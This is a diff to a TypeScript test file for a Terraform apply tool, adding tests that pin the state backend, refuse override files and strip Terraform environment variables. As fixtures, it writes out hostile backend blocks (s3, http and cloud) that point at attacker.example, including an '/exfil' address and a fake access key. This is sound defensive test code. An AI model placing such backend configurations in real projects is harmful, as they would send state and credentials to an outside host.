@@ -12,6 +12,7 @@ import { qualificationEvidenceProblems } from "../src/apply/evidence.js";
 import { attestedClientId, checkApplyIdentities, verifyIdentityTargets } from "../src/apply/identities.js";
 import { providerSpec } from "../src/apply/provider.js";
 import { AWS } from "../src/apply/providers/aws.js";
+import { BACKEND_OVERRIDE_FILE } from "../src/apply/backend-pin.js";
 import { openNonceStore } from "../src/apply/nonces.js";
 import { loadSealedPlan, reviewBundleOf } from "../src/apply/seal.js";
 import { APPLY_ADAPTER, APPLY_INIT_ARGV } from "../src/apply/terraform.js";
@@ -654,20 +655,77 @@ test("the built-in provider walker fails closed (#279 review B1, N1): a tree nes
   }
 });
 
-test("the project's backend block is judged before init: any attribute beyond bucket, key, region and use_lockfile is refused and no init runs", async () => {
-  const [bucket, ...key] = AWS_DEV_TARGET.backend.split("/");
-  const backend = (body: string) => `terraform {\n  backend "s3" {\n    bucket = "${bucket}"\n    key = "${key.join("/")}"\n    region = "${AWS_REGION}"\n    use_lockfile = true\n${body}\n  }\n}\n` + SHARED_TF;
+/** The contract's DEV target as the provider spec reads it. */
+const AWS_DEV_TARGET_PINNED = { accountId: AWS_DEV_TARGET.account, region: AWS_REGION, backend: AWS_DEV_TARGET.backend, workspace: "default" };
+
+test("the backend is pinned: whatever backend, cloud or state_store block the project has, init sees only the product override and the contract's location", async () => {
   const w = world();
-  assert.ok((await sealRefusal(w, "DEV", undefined, backend(""))).ok, "exactly the contract's settings are fine");
-  for (const body of [
-    '    endpoints = {\n      sts = "https://attacker.example"\n      s3 = "https://attacker.example"\n    }', '    access_key = "AKIAFAKEFAKEFAKE0000"\n    secret_key = "fake"',
-    '    profile = "operator"', '    shared_credentials_files = ["/home/operator/.aws/credentials"]', '    skip_credentials_validation = true',
+  for (const mainTf of [
+    SHARED_TF,
+    'terraform {\n  backend "s3" {\n    endpoints = { s3 = "https://attacker.example" }\n    access_key = "AKIAFAKEFAKEFAKE0000"\n  }\n}\n' + SHARED_TF,
+    'terraform {\n  backend "http" {\n    address = "https://attacker.example/exfil"\n  }\n}\n' + SHARED_TF,
+    'terraform {\n  cloud {\n    hostname = "attacker.example"\n  }\n}\n' + SHARED_TF,
   ]) {
+    behave({ applyAdvance: true });
+    const s = await seal(w, "DEV", mainTf);
+    const inits = calls().filter((c) => c.args[0] === "init");
+    assert.equal(inits.length, 1);
+    assert.deepEqual(inits[0].args, [...APPLY_INIT_ARGV], "every init reads the product's backend file");
+    assert.equal(inits[0].backendOverride, 'terraform {\n  backend "s3" {}\n}\n', "the fake engine sees the product override");
+    assert.equal(inits[0].workEntries?.filter((name) => /override\.tf(\.json)?$/i.test(name)).join(), BACKEND_OVERRIDE_FILE, "exactly one override file");
+    assert.equal(inits[0].backendConfig, AWS.backendLocation(AWS_DEV_TARGET_PINNED), "the seal's settings are the contract's location and nothing of the project's");
+    assert.ok(calls().every((c) => c.env.TF_DATA_DIR === ".terraform"), "every step uses init's own fresh data directory");
+    behave({ applyAdvance: true });
+    assert.ok((await run(w, s, approvalsFor(s))).ok);
+    const applyInit = calls().find((c) => c.args[0] === "init");
+    assert.equal(applyInit?.backendOverride, 'terraform {\n  backend "s3" {}\n}\n', "the apply's init is pinned too");
+    assert.ok(applyInit?.backendConfig?.startsWith(AWS.backendLocation(AWS_DEV_TARGET_PINNED)));
+  }
+});
+
+test("an override file in the project is refused by name before any engine step runs", async () => {
+  const w = world();
+  const sealWith = async (extra: (root: string) => void) => {
+    const target = awsTargetOf("DEV");
+    const root = fresh("project");
+    extra(root);
+    const p = writeProject(root, target, SHARED_TF);
+    return sealPreview({ invocation: human(target), environment: "DEV", target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved, requester: REQUESTER }, forEnv(w, "DEV"));
+  };
+  for (const [name, code] of [
+    ["override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["backend_override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["main_override.tf.json", "BACKEND_OVERRIDE_NOT_ALLOWED"],
+    ["Override.TF", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["zzzz_alz_backend_override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"],
+  ] as const) {
     behave();
-    const result = await sealRefusal(w, "DEV", undefined, backend(body));
+    const result = await sealWith((root) => writeFileSync(join(root, name), 'terraform {\n  backend "http" {\n    address = "https://attacker.example"\n  }\n}\n'));
     refused(result, "ARTIFACT_INVALID");
-    assert.match((result as { message: string }).message, /BACKEND_BLOCK_NOT_IN_CONTRACT/);
-    assert.deepEqual(calls().map((c) => c.args[0]), ["version"], "init never ran, so no credential was sent anywhere");
+    assert.match((result as { message: string }).message, new RegExp(code), name);
+    assert.deepEqual(calls(), [], name + ": no engine step ran, so nothing was contacted");
+  }
+  // Saved state never even reaches the snapshot (captureProjectFiles refuses it); the engine's own name check is the second layer (test/apply-backend-pin.test.ts).
+  const stateful = fresh("project");
+  writeFileSync(join(stateful, "terraform.tfstate"), "{}");
+  assert.throws(() => writeProject(stateful, awsTargetOf("DEV"), SHARED_TF), /STATE_OR_PLAN_FILE/);
+});
+
+test("an init that exits non-zero stops the seal: no plan, no show, nothing stored", async () => {
+  const w = world();
+  behave({ failOn: "init" });
+  const result = await sealRefusal(w, "DEV");
+  refused(result, "ARTIFACT_INVALID");
+  assert.deepEqual(calls().map((c) => c.args[0]), ["version", "init"]);
+});
+
+test("the sanitized Terraform child environment: no TF_CLI_ARGS*, TF_WORKSPACE, user TF_CLI_CONFIG_FILE or user TF_DATA_DIR reaches it; TF_DATA_DIR is always the product's", () => {
+  const base: NodeJS.ProcessEnv = {
+    ...awsIdentityEnv("DEV"), TF_CLI_ARGS: "-reconfigure", TF_CLI_ARGS_init: "-migrate-state", TF_WORKSPACE: "evil", TF_DATA_DIR: "/tmp/evil", TF_CLI_CONFIG_FILE: "/tmp/evil.tfrc",
+  };
+  for (const identity of ["STATE", "STATE_WRITE", "APPLY", "DISCOVERY"] as const) {
+    for (const name of ["TF_CLI_ARGS", "TF_CLI_ARGS_init", "TF_WORKSPACE", "TF_DATA_DIR", "TF_CLI_CONFIG_FILE"]) base["ALZ_" + identity + "_" + name] = "/tmp/evil";
+    const child = buildChildEnvironment({ profile: TERRAFORM_APPLY_PROFILE, base, toolDirs: ["/usr/bin"], home: "/h", tmp: "/t", identity });
+    assert.deepEqual(Object.keys(child.env).filter((key) => key.startsWith("TF_")).sort(), ["TF_DATA_DIR", "TF_IN_AUTOMATION"], identity);
+    assert.equal(child.env.TF_DATA_DIR, ".terraform");
+    for (const name of ["TF_CLI_ARGS", "TF_CLI_ARGS_init", "TF_WORKSPACE", "TF_DATA_DIR", "TF_CLI_CONFIG_FILE"]) assert.ok(child.refused.includes("ALZ_" + identity + "_" + name), identity + " " + name);
   }
 });
 
